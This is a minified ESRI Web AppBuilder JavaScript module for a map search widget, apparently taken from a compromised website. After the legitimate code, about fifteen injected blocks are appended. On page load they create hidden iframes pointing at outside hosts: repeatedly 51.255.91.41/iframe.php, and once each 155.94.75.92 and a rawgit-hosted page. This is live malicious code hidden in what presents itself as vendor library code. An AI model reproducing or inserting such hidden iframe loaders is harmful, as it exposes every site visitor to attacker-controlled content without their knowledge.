// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/on dojo/when dojo/promise/all jimu/BaseWidget jimu/portalUtils jimu/utils esri/lang esri/request esri/dijit/Search esri/tasks/locator esri/layers/FeatureLayer esri/InfoTemplate".split(" "),function(t,e,g,l,n,p,m,u,v,h,q,w,x,y,z,A){return t([u],{baseClass:"jimu-search-layers",declaredClass:"jimu.dijit.SearchLayers",_searchDijitReady:null,_searchDijit:null,_layerInfosObj:null,_esriLocatorRegExp:/geocode(.){0,3}\.arcgis.com\/arcgis\/rest\/services\/World\/GeocodeServer/g,
constructor:function(b,a,d,c){this._searchDijitReady=new l;this._layerInfosObj=d;this.own(d.on("layerInfosFilterChanged",e.hitch(this,this._onLayerInfosFilterChanged)));p(this._getConfigInfo(b,a)).then(e.hitch(this,function(a){return m(this._convertConfig(a)).then(function(a){return g.filter(a,function(a){return a})})})).then(e.hitch(this,function(a){b.sources=a;this._searchDijit=new x(b,c);this._searchDijit.startup();this.setFocus();this._searchDijitReady.resolve(this._searchDijit)}))},searchDijit:function(){return this._searchDijitReady},
setFocus:function(){this._searchDijit&&this._searchDijit.inputNode.focus()},destroy:function(){this._searchDijit&&(this._searchDijit.destroy(),this._searchDijit=null);this.inherited(arguments)},_onLayerInfosFilterChanged:function(b){g.some(b,e.hitch(this,function(a){this._searchDijit&&this._searchDijit.sources&&0<this._searchDijit.sources.length&&g.forEach(this._searchDijit.sources,function(b){b._featureLayerId===a.id&&b.featureLayer.setDefinitionExpression(a.getFilter())})}))},_getConfigInfo:function(b,
a){return b&&b.sources&&0<b.sources.length?(a=null,this._searchLayer(b.map)&&b.upgradeFromGeocoder?(a=b.map.itemInfo.itemData.applicationProperties.viewing.search,a=g.map(a.layers,e.hitch(this,function(a,c){c.hintText=a;return this._getQueryTypeGeocoder(b.map,c)},a.hintText)),m(a).then(e.hitch(this,function(a){b.sources=[].concat(a).concat(b.sources);return b}))):b):p(this._getSourcesFromPortalAndWebmap(b.map,a)).then(e.hitch(this,function(a){return{allPlaceholder:"",showInfoWindowOnSelect:!1,sources:a}}))},
_convertConfig:function(b){return g.map(b.sources,e.hitch(this,function(a){var d=new l;if(a&&a.url&&"locator"===a.type){var c={locator:new y(a.url||""),outFields:["*"],singleLineFieldName:a.singleLineFieldName||"",name:h.stripHTML(a.name||""),placeholder:h.stripHTML(a.placeholder||""),countryCode:a.countryCode||"",maxSuggestions:a.maxSuggestions,maxResults:a.maxResults||6,zoomScale:a.zoomScale||5E4,useMapExtent:!!a.searchInCurrentMapExtent};a.enableLocalSearch&&(c.localSearchOptions={minScale:a.localSearchMinScale,
distance:a.localSearchDistance});d.resolve(c)}else a&&a.url&&"query"===a.type?(c=new z(a.url||null,{outFields:["*"]}),this.own(n(c,"load",e.hitch(this,function(c){var f=c.layer,e=this._getInfoTemplate(f,a,a.displayField),k=null;a.searchFields&&0<a.searchFields.length?k=a.searchFields:(k=[],g.forEach(f.fields,function(a){"esriFieldTypeOID"!==a.type&&a.name!==f.objectIdField&&"esriFieldTypeGeometry"!==a.type&&k.push(a.name)}));c={featureLayer:f,outFields:["*"],searchFields:k,displayField:a.displayField||
"",exactMatch:!!a.exactMatch,name:h.stripHTML(a.name||""),placeholder:h.stripHTML(a.placeholder||""),maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,zoomScale:a.zoomScale||5E4,infoTemplate:e,useMapExtent:!!a.searchInCurrentMapExtent,_featureLayerId:a.layerId,enableHighlight:!0,showInfoWindowOnSelect:b.showInfoWindowOnSelect,enableInfoWindow:b.showInfoWindowOnSelect};e||delete c.infoTemplate;c._featureLayerId&&(e=this._layerInfosObj.getLayerInfoById(c._featureLayerId),f.setDefinitionExpression(e.getFilter()));
d.resolve(c)}))),this.own(n(c,"error",function(){d.resolve(null)}))):d.resolve(null);return d}))},_getInfoTemplate:function(b,a,d){var c=this._layerInfosObj.getLayerInfoById(a.layerId),f=c&&c.getInfoTemplate(),r=c&&f;if(c&&!r)return null;r||(f=new A,f.setTitle("\x26nbsp;"),f.setContent(e.hitch(this,"_formatContent",a.name,b,d)));return f},_getSourcesFromPortalAndWebmap:function(b,a){var d=[],c=null;this._searchLayer(b)&&(c=b.itemInfo.itemData.applicationProperties.viewing.search,g.forEach(c.layers,
e.hitch(this,function(a,c){c.hintText=a;d.push(this._getQueryTypeGeocoder(b,c))},c.hintText)));return v.getPortalSelfInfo(a).then(e.hitch(this,function(a){if((a=a.helperServices&&a.helperServices.geocode)&&0<a.length)for(var b=0,c=a.length;b<c;b++){var f=a[b];f&&d.push(this._processSingleLine(f))}return m(d).then(e.hitch(this,function(a){for(var b=[],c=0;c<a.length;c++){var d=a[c];d&&(d&&"query"===d.type||(d={name:d.name||this._getGeocodeName(d.url),url:d.url,singleLineFieldName:d.singleLineFieldName,
placeholder:d.placeholder||d.name||this._getGeocodeName(d.url),maxResults:6,searchInCurrentMapExtent:!1,type:"locator"},d.enableLocalSearch=this._isEsriLocator(d.url),d.localSearchMinScale=3E5,d.localSearchDistance=5E4),b.push(d))}return b}))}))},_getQueryTypeGeocoder:function(b,a){b=b.getLayer(a.id);var d=null,c=null,e=null,e=q.isDefined(a.subLayer)?a.id+"_"+a.subLayer:a.id,d=this._layerInfosObj.traversal(function(a){return a.id===e?(c=a,!0):!1});return b&&d&&c?(d=q.isDefined(a.subLayer)?c.url||
b.url+"/"+a.subLayer:c.url||b.url,{name:c.title,layerId:e,url:d,placeholder:a.hintText,searchFields:[a.field.name],displayField:a.field.name,exactMatch:a.field.exactMatch||!1,maxResults:6,searchInCurrentMapExtent:!1,type:"query"}):null},_isEsriLocator:function(b){this._esriLocatorRegExp.lastIndex=0;return this._esriLocatorRegExp.test(b)},_processSingleLine:function(b){if(b.singleLineFieldName)return b;if(this._isEsriLocator(b.url))return b.singleLineFieldName="SingleLine",b;var a=new l;w({url:b.url,
content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(e.hitch(this,function(d){d.singleLineAddressField&&d.singleLineAddressField.name?(b.singleLineFieldName=d.singleLineAddressField.name,a.resolve(b)):(console.warn(b.url+"has no singleLineFieldName"),a.resolve(null))}),e.hitch(this,function(b){console.error(b);a.resolve(null)}));return a.promise},_getGeocodeName:function(b){if("string"!==typeof b)return"geocoder";b=b.split("/");return b[b.length-2]||"geocoder"},_getGeocoderName:function(b){return this._getGeocodeName(b)},
_hasAppSearchInfo:function(b){return b.itemInfo&&b.itemInfo.itemData&&b.itemInfo.itemData.applicationProperties&&b.itemInfo.itemData.applicationProperties.viewing&&b.itemInfo.itemData.applicationProperties.viewing.search},_searchLayer:function(b){if(!this._hasAppSearchInfo(b))return!1;b=b.itemInfo.itemData.applicationProperties.viewing.search;return b.enabled&&0!==b.layers.length?!0:!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});